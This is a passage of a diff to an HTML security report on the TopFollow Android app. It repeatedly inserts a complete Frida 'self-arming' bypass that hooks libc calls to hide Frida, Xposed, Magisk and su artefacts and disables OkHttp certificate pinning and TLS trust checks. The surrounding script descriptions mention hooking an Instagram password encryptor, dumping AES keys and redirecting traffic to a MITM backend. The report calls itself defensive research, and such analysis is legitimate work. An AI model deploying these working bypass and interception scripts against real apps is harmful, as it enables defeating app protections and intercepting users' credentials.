+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 const H = (typeof module !== 'undefined' &amp;&amp; module.exports) ? module.exports : H;
 
 /* Set this to redirect the whole app to your own MITM/backend */
@@ -4278,9 +5141,115 @@ H.hr('backend traffic + ServerCheck hijack ARMED');
 </section>
 
 <section class="card" id="script-09_native_aes_dump">
-  <h3><span class="mono">09_native_aes_dump.js</span> <span class="muted">&mdash; 382 lines</span></h3>
+  <h3><span class="mono">09_native_aes_dump.js</span> <span class="muted">&mdash; 488 lines</span></h3>
   <p>Locates the AES S-box by content scan (not hard-coded offsets), Stalker-resolves every instruction that addresses it, attaches the five AES functions, and recovers any FIPS-197 round-key schedule from live memory.</p>
   <details><summary>Show source</summary><pre class="code"><code>'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 /* ============================================================================
  * 09_native_aes_dump.js
  * ----------------------------------------------------------------------------
@@ -4665,9 +5634,115 @@ setTimeout(main, 0);
 </section>
 
 <section class="card" id="script-10_java_crypto_layer">
-  <h3><span class="mono">10_java_crypto_layer.js</span> <span class="muted">&mdash; 303 lines</span></h3>
+  <h3><span class="mono">10_java_crypto_layer.js</span> <span class="muted">&mdash; 409 lines</span></h3>
   <p>Hooks q8.t1.f (the #PWD_INSTAGRAM:4 password encryptor), dissecting the AES-256-GCM key, IV, tag, RSA-wrapped key and plaintext; hooks every javax.crypto.Cipher.init to dump raw SecretKeySpec bytes; instruments helper.T ECDSA attestation and proves the dead digest([B)[B JNI bridge.</p>
   <details><summary>Show source</summary><pre class="code"><code>'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 /* ============================================================================
  * 10_java_crypto_layer.js
  * ----------------------------------------------------------------------------
@@ -5177,9 +6252,39 @@ frida -U -f com.nivaroid.topfollow \
 </div>
 </section>
 
+<!-- ============================================ 21 MERGE RECONCILIATION -->
+<section id="merge">
+<h2>21. Merge reconciliation &mdash; two independent analyses, one binary</h2>
+<div class="card">
+<p>Two independent reverse-engineering passes were performed on this APK. <b>Analysis A</b> (this repository's prior session: static + Capstone + Unicorn key-expansion tracing, 73-finding register, 11-script Frida lab) and <b>Analysis B</b> (independent: <code>REPORT_libtopfollow_so.md</code> revision 7, Unicorn <i>execution</i> of the cipher functions with known-answer tests, 22-slot JNI call map). Both were merged in this revision, and every disagreement was re-adjudicated against the actual bytes on 2026-09-14 (LIEF + Capstone + re-executed Unicorn suites from both sides; see <code>MERGE_RECONCILIATION.md</code> for the full table and reproduction commands).</p>
+<table class="data">
+<thead><tr><th>Claim</th><th>Analysis A</th><th>Analysis B</th><th>Binary evidence (re-verified 2026-09-14)</th><th>Verdict</th></tr></thead>
+<tbody>
+<tr><td><code>.so</code> size / <code>.rodata</code></td><td>1,805,400 B; AES tables <code>0x128b0</code>/<code>0x139b0</code>/<code>0x13b10</code></td><td>1,805,400 B; <code>.rodata</code> = 37,547 B; LibTomCrypt T-tables identified</td><td>LIEF section walk; FIPS-197 S-box bytes matched at A's offsets; T-tables regenerated bit-for-bit (B &sect;11.8 re-run)</td><td><b>both right</b></td></tr>
+<tr><td>Key expansion <code>0x32158</code></td><td>AES-256-shaped, 14 rcon reads, period-14, runtime-derived key</td><td>LibTomCrypt <code>rijndael_setup</code>, FIPS-197 schedules for 128/192/256</td><td>Unicorn re-run: 89,148 insns, SBOX&times;112, RCON&times;14; round keys at <code>ctx+0xc</code> stride 32 == FIPS-197 (11/13/15 rows)</td><td><b>both right</b>, same function</td></tr>
+<tr><td>Block-cipher mode</td><td>inconclusive statically</td><td><code>#85</code> = AES-ECB+PKCS#7&rarr;hex; <code>#30</code> = AES-128-CBC zero-key; <code>#36</code> = ECB-decrypt path</td><td>27/27 FIPS-197 KATs re-run &amp; matched; zero-key CBC identical for every key argument; ECB block-equality leak reproduced</td><td><b>B right</b> (executed proof); A's inconclusive superseded</td></tr>
+<tr><td><code>/proc/self/maps</code> read path</td><td><code>fopen</code>/<code>fgets</code></td><td><code>__open_2</code> + <code>read</code>/<code>__read_chk</code>; no <code>fopen</code>/<code>fgets</code>/<code>strstr</code> imported</td><td>88-entry import table checked: <code>fopen</code>/<code>fgets</code>/<code>strstr</code> <b>absent</b></td><td><b>B right; A disproven</b> on this row (bypass unaffected: it hooks <code>__open_2</code>/<code>read</code>)</td></tr>
+<tr><td>Zygisk / LSPosed markers</td><td>ABSENT</td><td>present (maps-scan tokens)</td><td>XOR-0x5A decode: <code>zygisk</code> @ <code>0x174bd</code>, <code>lsposed</code> @ <code>0x17485</code>; base64 copies @ <code>0x167a9</code>/<code>0x16f60</code></td><td><b>B right; A wrong</b></td></tr>
+<tr><td>9th su path</td><td><code>/su/bin/su</code></td><td><code>/data/local/su</code></td><td>pointer table <code>0x1b63a8</code> (9 relocations) &rarr; ptr <code>0x1741a</code> XOR-0x5A = <code>/data/local/su</code>; <code>/su/bin/su</code> absent under raw/0x55/0x5A</td><td><b>B right</b></td></tr>
+<tr><td>Instagram API bases</td><td><code>i.instagram.com/api/v1/</code>, <code>b.i.instagram.com/api/v1/</code> (XOR-0x55)</td><td><code>i.instagram.com/api/v2/</code>, <code>www.instagram.com/graphql/query</code> (nested b64)</td><td>all four literals decoded byte-for-byte; DEX corroborates</td><td><b>both right</b> &mdash; three bases coexist</td></tr>
+<tr><td>Native GCM</td><td>absent (no GHASH)</td><td>&ldquo;GCM proven native&rdquo; &rarr; final: mode inferred, not executed</td><td><code>func#191</code>: no <code>pmull</code>, no 0xE1 reduction constant, no table refs &rarr; not GHASH; key/nonce install by <code>#157/#158</code> re-verified</td><td><b>merged</b>: context + key material native (proven); GCM arithmetic not in the <code>.so</code> (A right); B's mode claim stays &ldquo;inferred&rdquo;</td></tr>
+<tr><td>Hardcoded symmetric secrets</td><td>not claimed</td><td><code>0123456789abcdef</code>; zero-key CBC; AES-192 key + two 12-B nonces; 12-B getter family</td><td>all byte-verified; KAT re-run</td><td><b>B right</b> &rarr; merged as CRYP-15&hellip;19</td></tr>
+<tr><td>Imports census</td><td>no TLS stack / crypto imports</td><td>&ldquo;92 imports&rdquo; vs &ldquo;88-symbol table&rdquo; (internal inconsistency)</td><td>88 unique imported names; 90 PLT stubs</td><td><b>A right</b>; B resolved to 88/90</td></tr>
+<tr><td>Timing check</td><td><code>clock_gettime</code> ABSENT</td><td><code>clock()</code> check <code>func#98</code> in 11 natives</td><td><code>clock</code> imported (1 site); <code>clock_gettime</code> absent</td><td><b>both right</b> (different symbols) &rarr; new INTE-15</td></tr>
+<tr><td>reCAPTCHA sitekey / backend / ServerCheck</td><td><code>6Ld3yDsp&hellip;jdQ</code> @ <code>0x1764b</code>; <code>top.nivafollower.app/v840/</code>; <code>topfollow_check.php</code></td><td>not claimed</td><td>XOR-0x55 decodes verified</td><td><b>A right</b></td></tr>
+<tr><td>Anti-replay UUID</td><td><code>bbeeba8e-beaa-4458-ac60-6d9a61b2be9e</code> &ldquo;&times;4&rdquo;</td><td>not claimed</td><td>exactly 1 XOR-0x55 copy @ <code>0x17673</code></td><td><b>A partly right</b> (value yes, multiplicity unproven)</td></tr>
+<tr><td>JNI surface</td><td>22 natives, none <code>([B)[B</code></td><td>22 = <code>func#51..#72</code> + slot&rarr;cipher&rarr;detection map</td><td>independent relocation walk reproduces all 22 fnPtrs; no <code>([B)[B</code> signature</td><td><b>both right</b>, cross-validated</td></tr>
+<tr><td>Pin blob</td><td>signing-cert digest constant</td><td>@ <code>0x15084</code>: Base64(Base64(hex)), 2 layers</td><td>decode chain reproduced</td><td><b>both right</b></td></tr>
+</tbody>
+</table>
+<div class="callout warn"><b>Disproven claims (kept out of the merged register, with proof).</b> 2 MB white-box AES table at <code>.rodata:0x9A000</code> (<code>.rodata</code> is only 37,547 B); 18 MB <code>.so</code> (file is 1,805,400 B); <code>sub_128A0</code> string decryptor (<code>0x128A0</code> is data 16 B before the S-box); 204 encrypted URLs (real corpus is small and enumerated); PBKDF2&rarr;white-box-AES-GCM&rarr;RSA-OAEP stack (none of the three exists); HMAC-SHA512 / ChaCha / native GCM arithmetic (no constants, no carry-less multiply); ptrace / TracerPid / property_get / hardware Play-Integrity / SVC anti-debug (imports and strings absent under raw/XOR-0x55/XOR-0x5A); &ldquo;Frida&rdquo; detection at <code>0x15e68</code> (the only match is <code>Friday</code>, the C++ locale weekday). Full table in <code>MERGE_RECONCILIATION.md</code> &sect;3.</div>
+<div class="callout ok"><b>Result of the merge.</b> The register grows from 73 to <b>79 findings</b> (the six B-sourced additions CRYP-15&hellip;19 and INTE-15, each independently re-verified). The merged detection set corrects three A rows (maps read path, Zygisk/LSPosed markers, 9th su path) and adds B's XOR-0x37 Frida blob and <code>clock()</code> timing check. Runtime mode of the 0x2fdcc/0x30f18 pipeline remains honestly inconclusive pending the optional device pass (script 09). No fabricated logs were produced or merged: Unicorn suites from both analyses were re-executed on 2026-09-14 and their outputs archived (<code>work/out/</code>, <code>work/analysis/verify_all.txt</code>).</div>
+</div>
+</section>
+
 <!-- ========================================================== 20 LEGAL -->
 <section id="legal">
-<h2>21. Scope, ethics &amp; responsible handling</h2>
+<h2>22. Scope, ethics &amp; responsible handling</h2>
 <div class="card">
 <h4>What this document is</h4>
 <p>A defensive security research report on a single APK file supplied for analysis. It documents vulnerabilities, explains their mechanisms, and provides instrumentation intended to let a defender reproduce and then fix them.</p>
@@ -5199,8 +6304,8 @@ frida -U -f com.nivaroid.topfollow \
 </section>
 
 <footer>
-<p><b>TopFollow v8.4.5-Beta (versionCode 845) &mdash; <code>com.nivaroid.topfollow</code></b> &middot; 73 findings &middot; 11 Frida scripts (10 PoCs + shared helper) &middot; 26 backend endpoints &middot; 22 native JNI functions mapped.</p>
-<p>APK SHA-256 <code>a60bcf064d0907072712a16398968d2f50c6802fc0d56fb60139030a98701a04</code> &middot; signing certificate SHA-256 <code>d845591e086033a9035fd6b66c3c3d73aa33af90794d6b986e64779eea6bec5e</code> &middot; report generated 2026-09-13 17:03 .</p>
+<p><b>TopFollow v8.4.5-Beta (versionCode 845) &mdash; <code>com.nivaroid.topfollow</code></b> &middot; 79 findings &middot; 11 Frida scripts (10 PoCs + shared helper) &middot; 26 backend endpoints &middot; 22 native JNI functions mapped.</p>
+<p>APK SHA-256 <code>a60bcf064d0907072712a16398968d2f50c6802fc0d56fb60139030a98701a04</code> &middot; signing certificate SHA-256 <code>d845591e086033a9035fd6b66c3c3d73aa33af90794d6b986e64779eea6bec5e</code> &middot; report generated 2026-09-14 13:19 .</p>
 <p class="muted">Produced by static and dynamic reverse engineering with androguard, LIEF, Capstone, asn1crypto and Frida. Self-contained single-file HTML &mdash; no external assets, no network requests. Use your browser's Print / Save as PDF for an offline copy; print styles strip the interactive chrome and expand all code blocks.</p>
 </footer>
 
